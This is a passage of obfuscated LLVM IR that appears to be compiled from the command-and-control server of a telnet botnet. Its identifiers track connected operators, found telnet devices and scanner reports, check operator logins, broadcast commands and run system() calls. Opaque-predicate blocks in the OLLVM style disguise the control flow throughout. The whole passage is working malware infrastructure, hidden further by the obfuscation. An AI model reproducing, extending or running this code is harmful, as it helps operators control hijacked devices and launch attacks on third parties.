  br i1 %1783, label %originalBB248, label %originalBB248alteredBB

originalBB248:                                    ; preds = %originalBB248alteredBB, %1775
  %1784 = load i32, i32* @x.15
  %1785 = load i32, i32* @y.16
  %1786 = sub i32 %1784, 1
  %1787 = mul i32 %1784, %1786
  %1788 = urem i32 %1787, 2
  %1789 = icmp eq i32 %1788, 0
  %1790 = icmp slt i32 %1785, 10
  %1791 = or i1 %1789, %1790
  br i1 %1791, label %originalBBpart2250, label %originalBB248alteredBB

originalBBpart2250:                               ; preds = %originalBB248
  br label %1792

; <label>:1792:                                   ; preds = %originalBBpart2250
  br label %561

; <label>:1793:                                   ; preds = %1538
  %1794 = load i32, i32* @x.15
  %1795 = load i32, i32* @y.16
  %1796 = sub i32 %1794, 1
  %1797 = mul i32 %1794, %1796
  %1798 = urem i32 %1797, 2
  %1799 = icmp eq i32 %1798, 0
  %1800 = icmp slt i32 %1795, 10
  %1801 = or i1 %1799, %1800
  br i1 %1801, label %originalBB252, label %originalBB252alteredBB

originalBB252:                                    ; preds = %originalBB252alteredBB, %1793
  %1802 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %1803 = call i8* @strstr(i8* %1802, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0)) #8
  %1804 = icmp ne i8* %1803, null
  %1805 = load i32, i32* @x.15
  %1806 = load i32, i32* @y.16
  %1807 = sub i32 %1805, 1
  %1808 = mul i32 %1805, %1807
  %1809 = urem i32 %1808, 2
  %1810 = icmp eq i32 %1809, 0
  %1811 = icmp slt i32 %1806, 10
  %1812 = or i1 %1810, %1811
  br i1 %1812, label %originalBBpart2254, label %originalBB252alteredBB

originalBBpart2254:                               ; preds = %originalBB252
  br i1 %1804, label %1813, label %1847

; <label>:1813:                                   ; preds = %originalBBpart2254
  %1814 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1814, i8 0, i64 2048, i32 16, i1 false)
  %1815 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i32 0, i32 0
  %1816 = load i32, i32* %5, align 4
  %1817 = sext i32 %1816 to i64
  %1818 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %1817
  %1819 = getelementptr inbounds %struct.login_info, %struct.login_info* %1818, i32 0, i32 0
  %1820 = getelementptr inbounds [20 x i8], [20 x i8]* %1819, i32 0, i32 0
  %1821 = call i32 (i8*, i8*, ...) @sprintf(i8* %1815, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.102, i32 0, i32 0), i8* %1820) #7
  %1822 = load i32, i32* %4, align 4
  %1823 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i32 0, i32 0
  %1824 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i32 0, i32 0
  %1825 = call i64 @strlen(i8* %1824) #8
  %1826 = call i64 @send(i32 %1822, i8* %1823, i64 %1825, i32 16384)
  %1827 = icmp eq i64 %1826, -1
  br i1 %1827, label %1828, label %1845

; <label>:1828:                                   ; preds = %1813
  %1829 = load i32, i32* @x.15
  %1830 = load i32, i32* @y.16
  %1831 = sub i32 %1829, 1
  %1832 = mul i32 %1829, %1831
  %1833 = urem i32 %1832, 2
  %1834 = icmp eq i32 %1833, 0
  %1835 = icmp slt i32 %1830, 10
  %1836 = or i1 %1834, %1835
  br i1 %1836, label %originalBB256, label %originalBB256alteredBB

originalBB256:                                    ; preds = %originalBB256alteredBB, %1828
  %1837 = load i32, i32* @x.15
  %1838 = load i32, i32* @y.16
  %1839 = sub i32 %1837, 1
  %1840 = mul i32 %1837, %1839
  %1841 = urem i32 %1840, 2
  %1842 = icmp eq i32 %1841, 0
  %1843 = icmp slt i32 %1838, 10
  %1844 = or i1 %1842, %1843
  br i1 %1844, label %originalBBpart2258, label %originalBB256alteredBB

originalBBpart2258:                               ; preds = %originalBB256
  br label %1940

; <label>:1845:                                   ; preds = %1813
  %1846 = call i32 @sleep(i32 5)
  br label %1940

; <label>:1847:                                   ; preds = %originalBBpart2254
  %1848 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %1848)
  %1849 = load i32, i32* %4, align 4
  %1850 = call i64 @send(i32 %1849, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.103, i32 0, i32 0), i64 11, i32 16384)
  %1851 = icmp eq i64 %1850, -1
  br i1 %1851, label %1852, label %1853

; <label>:1852:                                   ; preds = %1847
  br label %1940

; <label>:1853:                                   ; preds = %1847
  %1854 = load i32, i32* @x.15
  %1855 = load i32, i32* @y.16
  %1856 = sub i32 %1854, 1
  %1857 = mul i32 %1854, %1856
  %1858 = urem i32 %1857, 2
  %1859 = icmp eq i32 %1858, 0
  %1860 = icmp slt i32 %1855, 10
  %1861 = or i1 %1859, %1860
  br i1 %1861, label %originalBB260, label %originalBB260alteredBB

originalBB260:                                    ; preds = %originalBB260alteredBB, %1853
  %1862 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %1863 = call i64 @strlen(i8* %1862) #8
  %1864 = icmp eq i64 %1863, 0
  %1865 = load i32, i32* @x.15
  %1866 = load i32, i32* @y.16
  %1867 = sub i32 %1865, 1
  %1868 = mul i32 %1865, %1867
  %1869 = urem i32 %1868, 2
  %1870 = icmp eq i32 %1869, 0
  %1871 = icmp slt i32 %1866, 10
  %1872 = or i1 %1870, %1871
  br i1 %1872, label %originalBBpart2262, label %originalBB260alteredBB

originalBBpart2262:                               ; preds = %originalBB260
  br i1 %1864, label %1873, label %1890

; <label>:1873:                                   ; preds = %originalBBpart2262
  %1874 = load i32, i32* @x.15
  %1875 = load i32, i32* @y.16
  %1876 = sub i32 %1874, 1
  %1877 = mul i32 %1874, %1876
  %1878 = urem i32 %1877, 2
  %1879 = icmp eq i32 %1878, 0
  %1880 = icmp slt i32 %1875, 10
  %1881 = or i1 %1879, %1880
  br i1 %1881, label %originalBB264, label %originalBB264alteredBB

originalBB264:                                    ; preds = %originalBB264alteredBB, %1873
  %1882 = load i32, i32* @x.15
  %1883 = load i32, i32* @y.16
  %1884 = sub i32 %1882, 1
  %1885 = mul i32 %1882, %1884
  %1886 = urem i32 %1885, 2
  %1887 = icmp eq i32 %1886, 0
  %1888 = icmp slt i32 %1883, 10
  %1889 = or i1 %1887, %1888
  br i1 %1889, label %originalBBpart2266, label %originalBB264alteredBB

originalBBpart2266:                               ; preds = %originalBB264
  br label %561

; <label>:1890:                                   ; preds = %originalBBpart2262
  %1891 = load i32, i32* @x.15
  %1892 = load i32, i32* @y.16
  %1893 = sub i32 %1891, 1
  %1894 = mul i32 %1891, %1893
  %1895 = urem i32 %1894, 2
  %1896 = icmp eq i32 %1895, 0
  %1897 = icmp slt i32 %1892, 10
  %1898 = or i1 %1896, %1897
  br i1 %1898, label %originalBB268, label %originalBB268alteredBB

originalBB268:                                    ; preds = %originalBB268alteredBB, %1890
  %1899 = load i32, i32* %5, align 4
  %1900 = sext i32 %1899 to i64
  %1901 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %1900
  %1902 = getelementptr inbounds %struct.login_info, %struct.login_info* %1901, i32 0, i32 0
  %1903 = getelementptr inbounds [20 x i8], [20 x i8]* %1902, i32 0, i32 0
  %1904 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %1905 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.104, i32 0, i32 0), i8* %1903, i8* %1904)
  %1906 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.106, i32 0, i32 0))
  store %struct._IO_FILE* %1906, %struct._IO_FILE** %56, align 8
  %1907 = call i64 @time(i64* null) #7
  store i64 %1907, i64* %57, align 8
  %1908 = call %struct.tm* @gmtime(i64* %57) #7
  store %struct.tm* %1908, %struct.tm** %58, align 8
  %1909 = getelementptr inbounds [50 x i8], [50 x i8]* %59, i32 0, i32 0
  %1910 = load %struct.tm*, %struct.tm** %58, align 8
  %1911 = call i64 @strftime(i8* %1909, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.107, i32 0, i32 0), %struct.tm* %1910) #7
  %1912 = load %struct._IO_FILE*, %struct._IO_FILE** %56, align 8
  %1913 = getelementptr inbounds [50 x i8], [50 x i8]* %59, i32 0, i32 0
  %1914 = load i32, i32* %5, align 4
  %1915 = sext i32 %1914 to i64
  %1916 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %1915
  %1917 = getelementptr inbounds %struct.login_info, %struct.login_info* %1916, i32 0, i32 0
  %1918 = getelementptr inbounds [20 x i8], [20 x i8]* %1917, i32 0, i32 0
  %1919 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %1920 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1912, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.108, i32 0, i32 0), i8* %1913, i8* %1918, i8* %1919)
  %1921 = load %struct._IO_FILE*, %struct._IO_FILE** %56, align 8
  %1922 = call i32 @fclose(%struct._IO_FILE* %1921)
  %1923 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %1924 = load i32, i32* %4, align 4
  %1925 = load i32, i32* %5, align 4
  %1926 = sext i32 %1925 to i64
  %1927 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %1926
  %1928 = getelementptr inbounds %struct.login_info, %struct.login_info* %1927, i32 0, i32 0
  %1929 = getelementptr inbounds [20 x i8], [20 x i8]* %1928, i32 0, i32 0
  call void @broadcast(i8* %1923, i32 %1924, i8* %1929)
  %1930 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1930, i8 0, i64 2048, i32 16, i1 false)
  %1931 = load i32, i32* @x.15
  %1932 = load i32, i32* @y.16
  %1933 = sub i32 %1931, 1
  %1934 = mul i32 %1931, %1933
  %1935 = urem i32 %1934, 2
  %1936 = icmp eq i32 %1935, 0
  %1937 = icmp slt i32 %1932, 10
  %1938 = or i1 %1936, %1937
  br i1 %1938, label %originalBBpart2270, label %originalBB268alteredBB

originalBBpart2270:                               ; preds = %originalBB268
  br label %561

; <label>:1939:                                   ; preds = %561
  br label %1940

; <label>:1940:                                   ; preds = %1939, %1852, %1845, %originalBBpart2258, %1774, %originalBBpart2246, %originalBBpart2242, %1704, %1696, %1688, %originalBBpart2230, %originalBBpart2226, %originalBBpart2222, %1592, %originalBBpart2218, %originalBBpart2210, %1486, %1462, %1438, %originalBBpart2194, %1406, %1382, %1374, %1350, %1342, %1334, %1326, %1318, %1310, %originalBBpart2178, %originalBBpart2174, %originalBBpart2166, %1198, %1174, %originalBBpart2158, %1142, %1134, %1110, %1102, %1094, %originalBBpart2150, %536, %515, %490, %482, %474, %450, %442, %434, %originalBBpart258, %402, %originalBBpart254, %348, %322, %255, %233, %originalBBpart222, %154
  %1941 = load i32, i32* %4, align 4
  %1942 = sext i32 %1941 to i64
  %1943 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1942
  %1944 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1943, i32 0, i32 0
  store i32 0, i32* %1944, align 4
  %1945 = load i32, i32* %4, align 4
  %1946 = call i32 @close(i32 %1945)
  %1947 = load volatile i32, i32* @OperatorsConnected, align 4
  %1948 = add nsw i32 %1947, -1
  store volatile i32 %1948, i32* @OperatorsConnected, align 4
  br label %1949

; <label>:1949:                                   ; preds = %1940, %originalBBpart294, %originalBBpart286, %originalBBpart282, %581
  %1950 = load i32, i32* @x.15
  %1951 = load i32, i32* @y.16
  %1952 = sub i32 %1950, 1
  %1953 = mul i32 %1950, %1952
  %1954 = urem i32 %1953, 2
  %1955 = icmp eq i32 %1954, 0
  %1956 = icmp slt i32 %1951, 10
  %1957 = or i1 %1955, %1956
  br i1 %1957, label %originalBB272, label %originalBB272alteredBB

originalBB272:                                    ; preds = %originalBB272alteredBB, %1949
  %1958 = load i8*, i8** %2, align 8
  %1959 = load i32, i32* @x.15
  %1960 = load i32, i32* @y.16
  %1961 = sub i32 %1959, 1
  %1962 = mul i32 %1959, %1961
  %1963 = urem i32 %1962, 2
  %1964 = icmp eq i32 %1963, 0
  %1965 = icmp slt i32 %1960, 10
  %1966 = or i1 %1964, %1965
  br i1 %1966, label %originalBBpart2274, label %originalBB272alteredBB

originalBBpart2274:                               ; preds = %originalBB272
  ret i8* %1958

originalBBalteredBB:                              ; preds = %originalBB, %70
  %1967 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %1968 = call i32 @feof(%struct._IO_FILE* %1967) #7
  %1969 = icmp ne i32 %1968, 0
  %_ = sub i1 false, %1969
  %gen = add i1 %_, true
  %_1 = shl i1 %1969, true
  %_2 = sub i1 %1969, true
  %gen3 = mul i1 %_2, true
  %_4 = sub i1 %1969, true
  %gen5 = mul i1 %_4, true
  %1970 = xor i1 %1969, true
  br label %originalBB

originalBB6alteredBB:                             ; preds = %originalBB6, %91
  %1971 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %1972 = call i32 @fgetc(%struct._IO_FILE* %1971)
  store i32 %1972, i32* %15, align 4
  %1973 = load i32, i32* %14, align 4
  %_7 = shl i32 %1973, 1
  %_8 = shl i32 %1973, 1
  %_9 = sub i32 %1973, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 0, %1973
  %gen12 = add i32 %_11, 1
  %1974 = add nsw i32 %1973, 1
  store i32 %1974, i32* %14, align 4
  br label %originalBB6

originalBB16alteredBB:                            ; preds = %originalBB16, %112
  store i32 0, i32* %16, align 4
  %1975 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  call void @rewind(%struct._IO_FILE* %1975)
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %160
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %177
  %1976 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %1976)
  %1977 = load i32, i32* %5, align 4
  %1978 = sext i32 %1977 to i64
  %1979 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %1978
  %1980 = getelementptr inbounds %struct.login_info, %struct.login_info* %1979, i32 0, i32 0
  %1981 = getelementptr inbounds [20 x i8], [20 x i8]* %1980, i32 0, i32 0
  %1982 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %1983 = call i32 (i8*, i8*, ...) @sprintf(i8* %1981, i8* %1982) #7
  %1984 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  store i8* %1984, i8** %17, align 8
  %1985 = load i8*, i8** %17, align 8
  %1986 = call i32 @Find_Login(i8* %1985)
  store i32 %1986, i32* %5, align 4
  %1987 = load i8*, i8** %17, align 8
  %1988 = load i32, i32* %5, align 4
  %1989 = sext i32 %1988 to i64
  %1990 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %1989
  %1991 = getelementptr inbounds %struct.login_info, %struct.login_info* %1990, i32 0, i32 0
  %1992 = getelementptr inbounds [20 x i8], [20 x i8]* %1991, i32 0, i32 0
  %1993 = call i32 @strcmp(i8* %1987, i8* %1992) #8
  %1994 = icmp eq i32 %1993, 0
  br label %originalBB24

originalBB28alteredBB:                            ; preds = %originalBB28, %213
  %1995 = load i32, i32* %4, align 4
  %1996 = call i64 @send(i32 %1995, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.23, i32 0, i32 0), i64 22, i32 16384)
  %1997 = icmp eq i64 %1996, -1
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %234
  %1998 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %1999 = load i32, i32* %4, align 4
  %2000 = call i32 @fdgets(i8* %1998, i32 2048, i32 %1999)
  %2001 = icmp slt i32 %2000, 1
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %256
  %2002 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @trim(i8* %2002)
  %2003 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2004 = load i32, i32* %5, align 4
  %2005 = sext i32 %2004 to i64
  %2006 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %2005
  %2007 = getelementptr inbounds %struct.login_info, %struct.login_info* %2006, i32 0, i32 1
  %2008 = getelementptr inbounds [20 x i8], [20 x i8]* %2007, i32 0, i32 0
  %2009 = call i32 @strcmp(i8* %2003, i8* %2008) #8
  %2010 = icmp ne i32 %2009, 0
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %282
  br label %originalBB40

originalBB44alteredBB:                            ; preds = %originalBB44, %299
  %2011 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %2011, i8 0, i64 2048, i32 16, i1 false)
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %323
  %2012 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %2013 = call i32 (i8*, i8*, ...) @sprintf(i8* %2012, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.25, i32 0, i32 0)) #7
  %2014 = load i32, i32* %4, align 4
  %2015 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %2016 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i32 0, i32 0
  %2017 = call i64 @strlen(i8* %2016) #8
  %2018 = call i64 @send(i32 %2014, i8* %2015, i64 %2017, i32 16384)
  %2019 = icmp eq i64 %2018, -1
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %349
  %2020 = call i32 @sleep(i32 5)
  br label %originalBB52

originalBB56alteredBB:                            ; preds = %originalBB56, %410
  br label %originalBB56

originalBB60alteredBB:                            ; preds = %originalBB60, %451
  %2021 = load i32, i32* %4, align 4
  %2022 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %2023 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i32 0, i32 0
  %2024 = call i64 @strlen(i8* %2023) #8
  %2025 = call i64 @send(i32 %2021, i8* %2022, i64 %2024, i32 16384)
  %2026 = icmp eq i64 %2025, -1
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %491
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %516
  %2027 = load i32, i32* %4, align 4
  %2028 = call i64 @send(i32 %2027, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i32 0, i32 0), i64 12, i32 16384)
  %2029 = icmp eq i64 %2028, -1
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %537
  br label %originalBB72

originalBB76alteredBB:                            ; preds = %originalBB76, %583
  %2030 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2031 = call i8* @strstr(i8* %2030, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i32 0, i32 0)) #8
  %2032 = icmp ne i8* %2031, null
  br label %originalBB76

originalBB80alteredBB:                            ; preds = %originalBB80, %614
  store i8* null, i8** %2, align 8
  br label %originalBB80

originalBB84alteredBB:                            ; preds = %originalBB84, %647
  store i8* null, i8** %2, align 8
  br label %originalBB84

originalBB88alteredBB:                            ; preds = %originalBB88, %664
  %2033 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %2034 = load volatile i32, i32* @TELFound, align 4
  %2035 = load volatile i32, i32* @scannerreport, align 4
  %2036 = call i32 (i8*, i8*, ...) @sprintf(i8* %2033, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i32 0, i32 0), i32 %2034, i32 %2035) #7
  %2037 = load i32, i32* %4, align 4
  %2038 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %2039 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i32 0, i32 0
  %2040 = call i64 @strlen(i8* %2039) #8
  %2041 = call i64 @send(i32 %2037, i8* %2038, i64 %2040, i32 16384)
  %2042 = icmp eq i64 %2041, -1
  br label %originalBB88

originalBB92alteredBB:                            ; preds = %originalBB92, %691
  store i8* null, i8** %2, align 8
  br label %originalBB92

originalBB96alteredBB:                            ; preds = %originalBB96, %715
  %2043 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2044 = call i8* @strstr(i8* %2043, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0)) #8
  %2045 = icmp ne i8* %2044, null
  br label %originalBB96

originalBB100alteredBB:                           ; preds = %originalBB100, %735
  %2046 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.44, i32 0, i32 0))
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %759
  %2047 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2048 = call i8* @strstr(i8* %2047, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0)) #8
  %2049 = icmp ne i8* %2048, null
  br label %originalBB104

originalBB108alteredBB:                           ; preds = %originalBB108, %781
  %2050 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2051 = call i8* @strstr(i8* %2050, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.49, i32 0, i32 0)) #8
  %2052 = icmp ne i8* %2051, null
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %801
  %2053 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.50, i32 0, i32 0))
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %823
  %2054 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.52, i32 0, i32 0))
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %859
  %2055 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2056 = call i8* @strstr(i8* %2055, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0)) #8
  %2057 = icmp ne i8* %2056, null
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %879
  %2058 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.60, i32 0, i32 0))
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %901
  %2059 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.62, i32 0, i32 0))
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %929
  %2060 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.66, i32 0, i32 0))
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %947
  %2061 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2062 = call i8* @strstr(i8* %2061, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.67, i32 0, i32 0)) #8
  %2063 = icmp ne i8* %2062, null
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %969
  %2064 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i32 0, i32 0
  %2065 = call i8* @strstr(i8* %2064, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i32 0, i32 0)) #8
  %2066 = icmp ne i8* %2065, null
  br label %originalBB140

originalBB144alteredBB:                           ; preds = %originalBB144, %989
  %2067 = call i32 @system(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.70, i32 0, i32 0))
  br label %originalBB144

originalBB148alteredBB:                           ; preds = %originalBB148, %1070
  br label %originalBB148

originalBB152alteredBB:                           ; preds = %originalBB152, %1111
  %2068 = load i32, i32* %4, align 4
  %2069 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %2070 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i32 0, i32 0
  %2071 = call i64 @strlen(i8* %2070) #8
  %2072 = call i64 @send(i32 %2068, i8* %2069, i64 %2071, i32 16384)
  %2073 = icmp eq i64 %2072, -1
  br label %originalBB152

originalBB156alteredBB:                           ; preds = %originalBB156, %1150
  br label %originalBB156

originalBB160alteredBB:                           ; preds = %originalBB160, %1175
  %2074 = load i32, i32* %4, align 4
  %2075 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %2076 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i32 0, i32 0
  %2077 = call i64 @strlen(i8* %2076) #8
  %2078 = call i64 @send(i32 %2074, i8* %2075, i64 %2077, i32 16384)
  %2079 = icmp eq i64 %2078, -1
  br label %originalBB160

originalBB164alteredBB:                           ; preds = %originalBB164, %1206
  br label %originalBB164

originalBB168alteredBB:                           ; preds = %originalBB168, %1223
  %2080 = load i32, i32* %4, align 4
  %2081 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %2082 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i32 0, i32 0
  %2083 = call i64 @strlen(i8* %2082) #8
  %2084 = call i64 @send(i32 %2080, i8* %2081, i64 %2083, i32 16384)
  %2085 = icmp eq i64 %2084, -1
  br label %originalBB168

originalBB172alteredBB:                           ; preds = %originalBB172, %1246
  br label %originalBB172

originalBB176alteredBB:                           ; preds = %originalBB176, %1270
  br label %originalBB176

originalBB180alteredBB:                           ; preds = %originalBB180, %1287
  %2086 = load i32, i32* %4, align 4
  %2087 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %2088 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %2089 = call i64 @strlen(i8* %2088) #8
  %2090 = call i64 @send(i32 %2086, i8* %2087, i64 %2089, i32 16384)
  %2091 = icmp eq i64 %2090, -1
  br label %originalBB180

originalBB184alteredBB:                           ; preds = %originalBB184, %1351
  %2092 = load i32, i32* %4, align 4
  %2093 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %2094 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %2095 = call i64 @strlen(i8* %2094) #8
  %2096 = call i64 @send(i32 %2092, i8* %2093, i64 %2095, i32 16384)
  %2097 = icmp eq i64 %2096, -1
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %1383
  %2098 = load i32, i32* %4, align 4
  %2099 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %2100 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %2101 = call i64 @strlen(i8* %2100) #8
  %2102 = call i64 @send(i32 %2098, i8* %2099, i64 %2101, i32 16384)
  %2103 = icmp eq i64 %2102, -1
  br label %originalBB188

originalBB192alteredBB:                           ; preds = %originalBB192, %1414
  br label %originalBB192

originalBB196alteredBB:                           ; preds = %originalBB196, %1439
  %2104 = load i32, i32* %4, align 4
  %2105 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %2106 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %2107 = call i64 @strlen(i8* %2106) #8
  %2108 = call i64 @send(i32 %2104, i8* %2105, i64 %2107, i32 16384)
  %2109 = icmp eq i64 %2108, -1
  br label %originalBB196

originalBB200alteredBB:                           ; preds = %originalBB200, %1463
  %2110 = load i32, i32* %4, align 4
  %2111 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %2112 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %2113 = call i64 @strlen(i8* %2112) #8
  %2114 = call i64 @send(i32 %2110, i8* %2111, i64 %2113, i32 16384)
  %2115 = icmp eq i64 %2114, -1
  br label %originalBB200

originalBB204alteredBB:                           ; preds = %originalBB204, %1487
  %2116 = load i8*, i8** %3, align 8
  %2117 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %2116) #7
  br label %originalBB204

originalBB208alteredBB:                           ; preds = %originalBB208, %1520
  br label %originalBB208

originalBB212alteredBB:                           ; preds = %originalBB212, %1542
  %2118 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %2118, i8 0, i64 2048, i32 16, i1 false)
  %2119 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  %2120 = call i32 (i8*, i8*, ...) @sprintf(i8* %2119, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i32 0, i32 0)) #7
  %2121 = load i32, i32* %4, align 4
  %2122 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  %2123 = getelementptr inbounds [2048 x i8], [2048 x i8]* %54, i32 0, i32 0
  %2124 = call i64 @strlen(i8* %2123) #8
  %2125 = call i64 @send(i32 %2121, i8* %2122, i64 %2124, i32 16384)
  %2126 = icmp eq i64 %2125, -1
  br label %originalBB212

originalBB216alteredBB:                           ; preds = %originalBB216, %1568
  br label %originalBB216

originalBB220alteredBB:                           ; preds = %originalBB220, %1600
